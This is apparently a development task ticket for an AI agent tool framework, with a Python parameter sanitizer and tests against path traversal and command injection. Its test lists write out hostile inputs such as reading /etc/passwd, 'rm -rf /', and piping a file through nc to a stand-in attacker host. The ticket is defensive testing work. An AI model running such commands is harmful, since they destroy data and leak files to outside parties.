# Task: test-tool-02 - Add Malicious Tool Parameter Sanitization Tests

**Priority:** CRITICAL
**Effort:** 3-4 hours
**Status:** pending
**Owner:** unassigned
**Category:** Tool Safety (P0)

---

## Summary
Add tests to ensure tool parameters are sanitized to prevent path traversal, command injection, and other attacks.

---

## Files to Modify
- `tests/test_agents/test_standard_agent.py` - Add parameter sanitization tests
- `src/tools/executor.py` - Add parameter validation
- `src/tools/base.py` - Add parameter schema validation

---

## Acceptance Criteria

### Path Traversal Prevention
- [ ] Detect and block "../" in file paths
- [ ] Detect and block absolute paths outside allowed directories
- [ ] Detect and block null bytes in paths
- [ ] Detect and block symlink traversal
- [ ] Normalize paths before validation

### Command Injection Prevention
- [ ] Detect and block shell metacharacters (;, |, &, $, `)
- [ ] Detect and block command substitution attempts
- [ ] Parameterize commands instead of string interpolation
- [ ] Validate allowed command whitelist

### SQL Injection Prevention (if applicable)
- [ ] Use parameterized queries only
- [ ] Block SQL keywords in user input
- [ ] Validate input against expected schema

### Input Validation
- [ ] Validate parameter types match schema
- [ ] Validate string lengths (prevent DoS)
- [ ] Validate numeric ranges
- [ ] Sanitize special characters

### Error Handling
- [ ] Malicious parameters rejected BEFORE tool execution
- [ ] Clear error message indicating validation failure
- [ ] Log security violations for monitoring

---

## Implementation Details

```python
# src/tools/base.py
import re
from pathlib import Path
from typing import Any, Dict

class ParameterSanitizer:
    """Sanitizes tool parameters to prevent attacks."""
    
    @staticmethod
    def sanitize_path(path: str, allowed_base: str = None) -> str:
        """Sanitize file path to prevent traversal."""
        if not path:
            raise ValueError("Path cannot be empty")
        
        # Detect null bytes
        if '\x00' in path:
            raise SecurityError("Null bytes not allowed in path")
        
        # Normalize path
        normalized = Path(path).resolve()
        
        # Check if within allowed base
        if allowed_base:
            allowed = Path(allowed_base).resolve()
            try:
                normalized.relative_to(allowed)
            except ValueError:
                raise SecurityError(
                    f"Path traversal detected: {path} is outside {allowed_base}"
                )
        
        # Block obvious traversal attempts
        if ".." in Path(path).parts:
            raise SecurityError(f"Path traversal detected: {path}")
        
        return str(normalized)
    
    @staticmethod
    def sanitize_command(command: str, allowed_commands: list = None) -> str:
        """Sanitize command to prevent injection."""
        if not command:
            raise ValueError("Command cannot be empty")
        
        # Block shell metacharacters
        dangerous_chars = [';', '|', '&', '$', '`', '\n', '\r']
        for char in dangerous_chars:
            if char in command:
                raise SecurityError(
                    f"Dangerous character '{char}' in command: {command}"
                )
        
        # Whitelist validation
        if allowed_commands:
            cmd_name = command.split()[0]
            if cmd_name not in allowed_commands:
                raise SecurityError(
                    f"Command '{cmd_name}' not in allowed list: {allowed_commands}"
                )
        
        return command
    
    @staticmethod
    def validate_parameter(value: Any, schema: Dict[str, Any]) -> Any:
        """Validate parameter against schema."""
        param_type = schema.get("type")
        
        # Type validation
        if param_type == "string":
            if not isinstance(value, str):
                raise ValueError(f"Expected string, got {type(value)}")
            
            # Length validation
            max_length = schema.get("maxLength", 10000)
            if len(value) > max_length:
                raise ValueError(f"String too long: {len(value)} > {max_length}")
        
        elif param_type == "integer":
            if not isinstance(value, int):
                raise ValueError(f"Expected int, got {type(value)}")
            
            # Range validation
            minimum = schema.get("minimum")
            maximum = schema.get("maximum")
            if minimum is not None and value < minimum:
                raise ValueError(f"Value {value} < minimum {minimum}")
            if maximum is not None and value > maximum:
                raise ValueError(f"Value {value} > maximum {maximum}")
        
        return value

class SecurityError(Exception):
    """Raised when security violation detected."""
    pass
```

```python
# tests/test_agents/test_standard_agent.py

def test_standard_agent_blocks_path_traversal():
    """Test agent blocks path traversal in tool parameters."""
    class FileReaderTool(BaseTool):
        name = "file_reader"
        parameters = {
            "path": {"type": "string", "description": "File path"}
        }
        
        def execute(self, path: str) -> str:
            # Should never reach here with malicious path
            return open(path).read()
    
    agent = StandardAgent(minimal_agent_config)
    
    # Mock LLM to return path traversal attempt
    malicious_calls = [
        {"name": "file_reader", "parameters": {"path": "../../../../etc/passwd"}},
        {"name": "file_reader", "parameters": {"path": "/etc/passwd"}},
        {"name": "file_reader", "parameters": {"path": "test\x00file"}},  # Null byte
    ]
    
    for call in malicious_calls:
        result = agent._execute_tool_call(call)
        
        # Should be blocked
        assert "error" in result or result is None
        # File should NOT be read
        # (Implementation should block before tool.execute)

def test_tool_parameter_sanitizer_blocks_command_injection():
    """Test parameter sanitizer blocks command injection."""
    sanitizer = ParameterSanitizer()
    
    malicious_commands = [
        "ls; rm -rf /",
        "cat file | nc attacker.com 1234",
        "echo `whoami`",
        "command && malicious_command",
        "command\nmalicious_line",
    ]
    
    for cmd in malicious_commands:
        with pytest.raises(SecurityError, match="Dangerous character"):
            sanitizer.sanitize_command(cmd)

def test_tool_parameter_sanitizer_validates_schema():
    """Test parameter validator enforces schema constraints."""
    sanitizer = ParameterSanitizer()
    
    # String length violation
    schema = {"type": "string", "maxLength": 100}
    with pytest.raises(ValueError, match="too long"):
        sanitizer.validate_parameter("x" * 1000, schema)
    
    # Integer range violation
    schema = {"type": "integer", "minimum": 0, "maximum": 100}
    with pytest.raises(ValueError, match="minimum"):
        sanitizer.validate_parameter(-1, schema)
    with pytest.raises(ValueError, match="maximum"):
        sanitizer.validate_parameter(101, schema)

def test_tool_executor_sanitizes_before_execution():
    """Test tool executor sanitizes parameters BEFORE calling tool."""
    sanitization_order = []
    
    class TestTool(BaseTool):
        name = "test"
        parameters = {
            "path": {"type": "string"}
        }
        
        def execute(self, path: str) -> str:
            sanitization_order.append("tool_execute")
            return f"Read {path}"
    
    registry = ToolRegistry()
    registry.register(TestTool())
    
    executor = ToolExecutor(registry)
    
    # Mock sanitize_path to track call order
    original_sanitize = ParameterSanitizer.sanitize_path
    def tracked_sanitize(*args, **kwargs):
        sanitization_order.append("sanitize")
        return original_sanitize(*args, **kwargs)
    
    with patch.object(ParameterSanitizer, 'sanitize_path', tracked_sanitize):
        try:
            executor.execute("test", {"path": "../../../../etc/passwd"})
        except SecurityError:
            pass
    
    # Sanitization should happen BEFORE tool execution
    assert sanitization_order[0] == "sanitize"
    # Tool should never execute if sanitization fails
    assert "tool_execute" not in sanitization_order
```

---

## Test Strategy
- Test with OWASP path traversal payloads
- Test with command injection test cases
- Test with null bytes, Unicode, and encoding tricks
- Verify logging of security violations

---

## Success Metrics
- [ ] All path traversal attempts blocked
- [ ] All command injection attempts blocked
- [ ] Parameters validated before tool execution
- [ ] Zero false negatives on OWASP test suite
- [ ] Coverage of sanitization >95%

---

## Dependencies
- **Blocked by:** None
- **Blocks:** None
- **Integrates with:** src/tools/executor.py, all tools

---

## Design References
- OWASP Path Traversal: https://owasp.org/www-community/attacks/Path_Traversal
- OWASP Command Injection: https://owasp.org/www-community/attacks/Command_Injection
- QA Report: test_standard_agent.py - Parameter Sanitization (P0)
